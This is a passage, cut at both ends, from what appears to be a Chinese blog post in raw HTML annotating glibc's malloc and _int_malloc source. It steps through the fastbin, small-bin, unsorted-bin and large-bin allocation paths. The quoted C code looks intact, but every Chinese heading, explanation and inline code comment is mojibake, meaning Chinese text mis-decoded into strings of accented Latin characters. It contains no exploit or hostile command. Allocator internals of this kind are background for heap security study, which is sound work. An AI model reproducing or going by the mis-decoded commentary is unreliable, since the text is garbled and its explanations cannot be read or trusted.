class="hljs-comment">//è¯»å–__malloc_hooké’©å­å‡½æ•°ï¼Œå¦‚æœæœ‰åˆ™è¿è¡Œé’©å­å‡½æ•°å¹¶è¿”å›</span><br><br>  arena_get (ar_ptr, bytes);<br><span class="hljs-comment">//å¯»æ‰¾ä¸€ä¸ªarenaåˆ†é…å†…å­˜</span><br><br>  victim = _int_malloc (ar_ptr, bytes);<br><span class="hljs-comment">//è°ƒç”¨_int_malloc()åˆ†é…å†…å­˜</span><br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br><span class="hljs-comment">//ä¸æˆåŠŸå°±ç»§ç»­å°è¯•å¯»æ‰¾arena</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><span class="hljs-comment">//ç”³è¯·aneraè¿˜éœ€è¦è§£é”</span><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br><span class="hljs-comment">//æ£€æŸ¥  </span><br><span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-mallocæºç åŠè§£æ"><a href="#int-mallocæºç åŠè§£æ" class="headerlink" title="_int_mallocæºç åŠè§£æ"></a>_int_mallocæºç åŠè§£æ</h3><p>_int_mallocä¸­å †å—çš„æœç´¢é¡ºåºï¼š</p><ol><li>fastbinä¸­å¯»æ‰¾å®Œå…¨ä¸€æ ·çš„</li><li>small binä¸­å¯»æ‰¾å®Œå…¨ä¸€æ ·çš„</li><li>å¦‚æœ2ä¸æ»¡è¶³ä¸”victim&#x3D;&#x3D;nullï¼Œè°ƒç”¨malloc_consolidateå¹¶åˆå§‹åŒ–å †</li><li>è®¡ç®—large binçš„indexï¼Œè°ƒç”¨consolidateæ•´ç†fastbin</li><li>éå†unsorted binå¹¶æ•´ç†ï¼Œå¯»æ‰¾å®Œå…¨ä¸€æ ·çš„ï¼Œå¦‚æœè¯·æ±‚çš„chunkå±äºsmall binã€æ˜¯remainderã€å¯æ‹†åˆ†ä¸”æ˜¯unsorted binä¸­å”¯ä¸€çš„chunkï¼Œæ‹†åˆ†å¹¶è¿”å›ã€‚åœ¨éå†è¿‡ç¨‹ä¸­å¦‚æœé‡åˆ°å¤§å°å®Œå…¨ä¸€æ ·çš„ç›´æ¥è¿”å›</li><li>åœ¨large binä¸­æ‰¾ï¼Œæ¯”éœ€æ±‚å¤§çš„æœ€å°çš„ä¸€ä¸ªï¼Œå¦‚æœå¯åˆ†å‰²å°±åˆ†å‰²åè¿”å›ï¼Œremainderæ’å…¥unsorted binï¼Œå¦åˆ™ç›´æ¥è¿”å›</li><li>binmapæœç´¢bins</li><li>åˆ‡å‰²top chunk</li></ol><h4 id="å¤§å°è½¬åŒ–å’Œarenaæ£€æŸ¥"><a href="#å¤§å°è½¬åŒ–å’Œarenaæ£€æŸ¥" class="headerlink" title="å¤§å°è½¬åŒ–å’Œarenaæ£€æŸ¥"></a>å¤§å°è½¬åŒ–å’Œarenaæ£€æŸ¥</h4><p>ï¼ˆ1ï¼‰è¯·æ±‚çš„bytesè½¬åŒ–ä¸ºchunkçš„å¤§å°nbï¼Œå¦‚æœæ²¡æœ‰arenaå°±è°ƒç”¨sysmalloc()ï¼Œç”¨mmap()åˆ†é…chunkè¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">    mmap.  */<br> <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>   &#123;<br>     <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>     <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>alloc_perturb (p, bytes);<br>     <span class="hljs-keyword">return</span> p;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="fastbinæ‰«æ"><a href="#fastbinæ‰«æ" class="headerlink" title="fastbinæ‰«æ"></a>fastbinæ‰«æ</h4><p>ï¼ˆ2ï¼‰åœ¨fastbinä¸­å¯»æ‰¾å¤§å°å®Œå…¨ä¸€æ ·çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>   &#123;<br><span class="hljs-comment">//æ ¹æ®nbæ‰¾åˆ°fastbinç›¸åº”çš„å…ƒç´ </span><br>     idx = fastbin_index (nb);<br>     mfastbinptr *fb = &amp;fastbin (av, idx);<br>     mchunkptr pp = *fb;<br><span class="hljs-comment">//å¦‚æœfastbinä¸­æœ‰chunkæŒ‰LIFOè§„åˆ™å–å‡º</span><br>     <span class="hljs-keyword">do</span><br>       &#123;<br>         victim = pp;<br>         <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>           <span class="hljs-keyword">break</span>;<br>       &#125;<br>     <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>            != victim);<br><span class="hljs-comment">//å¦‚æœvictimï¼=nullï¼Œæ£€æŸ¥åè¿”å›ç»™ç”¨æˆ·</span><br>     <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>       &#123;<br>         <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>           &#123;<br><span class="hljs-comment">//chunksizeå’Œç›¸åº”fastbiné“¾çš„å¤§å°ç›¸ç¬¦æ£€æµ‹</span><br>             errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>           errout:<br>             malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>           &#125;<br>         check_remalloced_chunk (av, victim, nb);<br>         <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>         alloc_perturb (p, bytes);<br>         <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="small-binæ‰«æ"><a href="#small-binæ‰«æ" class="headerlink" title="small binæ‰«æ"></a>small binæ‰«æ</h4><p>ï¼ˆ3ï¼‰åœ¨small binä¸­æ‰¾å¤§å°å®Œå…¨ä¸€æ ·çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>   &#123;<br><span class="hljs-comment">//æ ¹æ®nbæ‰¾small binsä¸­ç›¸åº”çš„bin</span><br>     idx = smallbin_index (nb);<br>     bin = bin_at (av, idx);<br><br>     <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br><span class="hljs-comment">//å¦‚æœbiné“¾ä¸ä¸ºç©º</span><br><span class="hljs-comment">//å–biné“¾ä¸­çš„æœ€åä¸€ä¸ªchunk</span><br>       &#123;<br>         <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>           malloc_consolidate (av);<br><span class="hljs-comment">//å¦‚æœvictim==nullè°ƒç”¨malloc_consolidateå¹¶åˆå§‹åŒ–å †</span><br>         <span class="hljs-keyword">else</span><span class="hljs-comment">//æœ‰ç¬¦åˆè¦æ±‚çš„chunk</span><br>           &#123;<br>             bck = victim-&gt;bk;<br><span class="hljs-comment">//æ£€æŸ¥victim-&gt;bkçš„fdæ˜¯å¦æŒ‡å‘victim</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>               &#123;<br>                 errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                 <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br><span class="hljs-comment">//victimçš„nextchunkçš„inuseä½ç½®1</span><br>             set_inuse_bit_at_offset (victim, nb);<br>             bin-&gt;bk = bck;<br>             bck-&gt;fd = bin;<br><span class="hljs-comment">//ä»biné“¾ä¸­æ‘˜ä¸‹victim</span><br>             <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>               victim-&gt;size |= NON_MAIN_ARENA;<br><span class="hljs-comment">//è¿”å›ç»™ç”¨æˆ·</span><br>             check_malloced_chunk (av, victim, nb);<br>             <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="largebinçš„indexè®¡ç®—å¹¶æ•´ç†fastbin"><a href="#largebinçš„indexè®¡ç®—å¹¶æ•´ç†fastbin" class="headerlink" title="largebinçš„indexè®¡ç®—å¹¶æ•´ç†fastbin"></a>largebinçš„indexè®¡ç®—å¹¶æ•´ç†fastbin</h4><p>ï¼ˆ4ï¼‰å¦‚æœnbä¸å±äºsmall binï¼Œè®¡ç®—large binçš„indexå¹¶è°ƒç”¨malloc_consolidateæ•´ç†fastbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>   &#123;<br>     idx = largebin_index (nb);<br>     <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>       malloc_consolidate (av);<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="éå†unsorted-binå¹¶æ•´ç†"><a href="#éå†unsorted-binå¹¶æ•´ç†" class="headerlink" title="éå†unsorted binå¹¶æ•´ç†"></a>éå†unsorted binå¹¶æ•´ç†</h4><p>ï¼ˆ5ï¼‰è¿›å…¥ä¸€ä¸ªå¤§çš„for(;;)å¾ªç¯ï¼Œå¾ªç¯ä»¥ä¸‹æ‰€æœ‰æ­¥éª¤ã€‚ç¬¬ä¸€æ­¥å…ˆä»æœ€åä¸€ä¸ªchunkå¼€å§‹éå†unsorted binå¹¶æ•´ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(;;)<br>&#123;<br><span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br><span class="hljs-comment">//æ£€æŸ¥chunkçš„å¤§å°æ˜¯å¦ç¬¦åˆunsorted bin</span><br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br><br>â€¦â€¦<br><br><br><span class="hljs-comment">//ä»unsorted binä¸­æ‘˜ä¸‹æœ€åä¸€ä¸ªéå†è¿‡çš„chunk</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br><br>â€¦â€¦<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>&#125;<br><br>â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="unsorted-binä¸­å…ˆé‡last-remainder"><a href="#unsorted-binä¸­å…ˆé‡last-remainder" class="headerlink" title="unsorted binä¸­å…ˆé‡last_remainder"></a>unsorted binä¸­å…ˆé‡last_remainder</h4><p>ï¼ˆ6ï¼‰å¦‚æœnbå±äºsmall binï¼ˆå¯èƒ½ä¸Šæ¬¡small binä¸­æŸ¥è¯¢æ—¶æ˜¯ç©ºçš„ï¼‰ã€unsorted binåªæœ‰è¿™ä¸€ä¸ªchunkã€victimæ˜¯last_remainderï¼ˆä¸Šæ¬¡åˆ‡åˆ†chunkå‰©ä¸‹çš„ï¼‰ä¸”å¯ä»¥æ‹†åˆ†çš„è¯æ‹†åˆ†è¿™ä¸ªchunkå¹¶è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>            bck == unsorted_chunks (av) &amp;&amp;<br>            victim == av-&gt;last_remainder &amp;&amp;<br>            (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>          &#123;<br>            <span class="hljs-comment">/* split and reattach remainder */</span><br><span class="hljs-comment">//æ›´æ–°remainder chunkä¿¡æ¯</span><br>            remainder_size = size - nb;<br>            remainder = chunk_at_offset (victim, nb);<br><span class="hljs-comment">//æ–°remainderè¿å…¥unsorted bin</span><br>            unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>            av-&gt;last_remainder = remainder;<br>            remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br><span class="hljs-comment">//å¦‚æœremainderå¤„äºlarge binåˆ™æ¸…ç©ºfd_nextsizeå’Œbk_nextsize</span><br>            <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>              &#123;<br>                remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>              &#125;<br><span class="hljs-comment">//è¿˜æ˜¯æ›´æ–°remainder chunkä¿¡æ¯</span><br>            set_head (victim, nb | PREV_INUSE |<br>                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>            set_head (remainder, remainder_size | PREV_INUSE);<br>            set_foot (remainder, remainder_size);<br><br><span class="hljs-comment">//è¿”å›ç»™ç”¨æˆ·</span><br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br></code></pre></td></tr></table></figure><h4 id="unsorted-binä¸­åæ‰¾åˆ°åˆé€‚chunk"><a href="#unsorted-binä¸­åæ‰¾åˆ°åˆé€‚chunk" class="headerlink" title="unsorted binä¸­åæ‰¾åˆ°åˆé€‚chunk"></a>unsorted binä¸­åæ‰¾åˆ°åˆé€‚chunk</h4><p>ï¼ˆ7ï¼‰å¦‚æœå¤§å°å’Œnbä¸€æ ·ç›´æ¥è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (size == nb)<br>  &#123;<br>    set_inuse_bit_at_offset (victim, size);<br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>      victim-&gt;size |= NON_MAIN_ARENA;<br>    check_malloced_chunk (av, victim, nb);<br>    <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>    alloc_perturb (p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>  &#125;<br></code></pre></td></tr></table></figure><h4 id="æ•´ç†åœ¨éå†unsorted-binä¸­æ‘˜ä¸‹æ¥çš„chunk"><a href="#æ•´ç†åœ¨éå†unsorted-binä¸­æ‘˜ä¸‹æ¥çš„chunk" class="headerlink" title="æ•´ç†åœ¨éå†unsorted binä¸­æ‘˜ä¸‹æ¥çš„chunk"></a>æ•´ç†åœ¨éå†unsorted binä¸­æ‘˜ä¸‹æ¥çš„chunk</h4><p>ï¼ˆ8ï¼‰æ•´ç†åˆ†ç±»æ‘˜ä¸‹æ¥çš„victim<br>large binè¯´æ˜ï¼š</p><ul><li>large binå¯ä»¥çœ‹ä½œç”±fd_nextsizeå’Œbk_nextsizeè¿èµ·æ¥çš„ä¸€ä¸ªä¸ªå°é“¾è¡¨ï¼Œå°é“¾è¡¨ç”¨fdå’Œbkè¿æ¥ï¼Œä¸€ä¸ªå°é“¾è¡¨å†…çš„chunkå¤§å°ç›¸åŒ</li><li>æŠŠlarge binæ•°ç»„çš„å…ƒç´ å½“ä½œç¬¬ä¸€ä¸ªå°é“¾è¡¨ï¼Œåªæœ‰ä¸€ä¸ªchunkï¼Œå…¶fdå’Œbkè§†ä¸ºfd_nextsizeå’Œbk_nextsizeï¼Œè¿æ¥é“¾è¡¨ä¸­æœ€å¤§çš„chunké“¾è¡¨å’Œæœ€å°çš„chunké“¾è¡¨</li><li>å°é“¾è¡¨æŒ‰ä»å¤§åˆ°å°æ’åˆ—ï¼Œbinå…ƒç´ çš„fdæŒ‡å‘æœ€å¤§çš„chunké“¾è¡¨ï¼ŒbkæŒ‡å‘æœ€å°çš„chunké“¾è¡¨</li><li>biné“¾è¡¨çš„æœ€å¤§chunké“¾å’Œæœ€å°chunké“¾é€šè¿‡nextsizeç›¸è¿  </li><li>å°chunké“¾çš„å‰åç«¯è¿å‘ä¸¤è¾¹çš„ä¸¤ä¸ªchunké“¾å¤´<img src="/2023/01/20/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/large_bin.jpg" class title="large biné“¾è¡¨ç»“æ„ï¼ˆå›¾æºè§æ°´å°ï¼‰"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//bckè¡¨ç¤ºvictimçš„å‰ä¸€ä¸ªchunkï¼Œfwdè¡¨ç¤ºvictimçš„åä¸€ä¸ªchunk</span><br><span class="hljs-comment">//å¦‚æœç¬¦åˆsmall bin</span><br>         <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>           &#123;<br>             victim_index = smallbin_index (size);<br>             bck = bin_at (av, victim_index);<br>             fwd = bck-&gt;fd;<br>           &#125;<br><span class="hljs-comment">//å¦åˆ™æ”¾è¿›large bin</span><br>         <span class="hljs-keyword">else</span><br>           &#123;<br>             victim_index = largebin_index (size);<br>             bck = bin_at (av, victim_index);<span class="hljs-comment">//ç¬¬ä¸€ä¸ªå°é“¾è¡¨</span><br>             fwd = bck-&gt;fd;<span class="hljs-comment">//ç¬¬äºŒä¸ªå°é“¾è¡¨</span><br><br>             <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>             <span class="hljs-keyword">if</span> (fwd != bck)<span class="hljs-comment">//é“¾è¡¨ä¸ç©º</span><br>               &#123;<br>                 <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                 size |= PREV_INUSE;<br>                 <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                 assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                 <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<span class="hljs-comment">//æ¯”æœ€å°çš„è¿˜å°</span><br>                   &#123;<br>                     fwd = bck;<span class="hljs-comment">//ç¬¬ä¸€ä¸ªå°é“¾è¡¨</span><br>                     bck = bck-&gt;bk;<span class="hljs-comment">//æœ€åä¸€ä¸ªå°é“¾è¡¨</span><br><br>                     victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="hljs-comment">//è¿æ¥æœ€å¤§chunké“¾                    </span><br>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="hljs-comment">//è¿æ¥åŸæœ€å°chunké“¾</span><br>                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//å‰åç›¸è¿</span><br>                   &#125;<br>                 <span class="hljs-keyword">else</span><br>                   &#123;<br>                     assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                     <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                       &#123;<br>                         fwd = fwd-&gt;fd_nextsize;<br>                         assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                       &#125;<span class="hljs-comment">//æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ¯”victimå°çš„</span><br><br>                     <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                       <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                       fwd = fwd-&gt;fd;<br>                     <span class="hljs-keyword">else</span><br>                       &#123;<br>                         victim-&gt;fd_nextsize = fwd;<br>                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                         fwd-&gt;bk_nextsize = victim;<br>                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//æ¥å…¥nextsizeé“¾</span><br>                       &#125;<br>                     bck = fwd-&gt;bk;<br>                   &#125;<br>               &#125;<br>             <span class="hljs-keyword">else</span><span class="hljs-comment">//å¦‚æœé“¾ç©º</span><br>               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>           &#125;<br><span class="hljs-comment">//æ¥å…¥biné“¾</span><br>         mark_bin (av, victim_index);<span class="hljs-comment">//æ ‡è¯†binmap</span><br>         victim-&gt;bk = bck;<br>         victim-&gt;fd = fwd;<br>         fwd-&gt;bk = victim;<br>         bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure></li></ul><h4 id="åœ¨large-binä¸­æŸ¥æ‰¾"><a href="#åœ¨large-binä¸­æŸ¥æ‰¾" class="headerlink" title="åœ¨large binä¸­æŸ¥æ‰¾"></a>åœ¨large binä¸­æŸ¥æ‰¾</h4><p>ï¼ˆ9ï¼‰åœ¨large binä¸­æ‰¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//å¦‚æœnbåœ¨large binèŒƒå›´å†…</span><br>     <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>       &#123;<br>         bin = bin_at (av, idx);<br><br>         <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br><span class="hljs-comment">//å¦‚æœbinä¸­éç©ºä¸”æœ€å¤§chunkçš„size&gt;nbï¼Œ</span><br>         <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>             (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>           &#123;<br>             victim = victim-&gt;bk_nextsize;<br><span class="hljs-comment">//å®šä½è‡³æœ€å°çš„chunké“¾</span><br>             <span class="hljs-keyword">while</span> (((<span 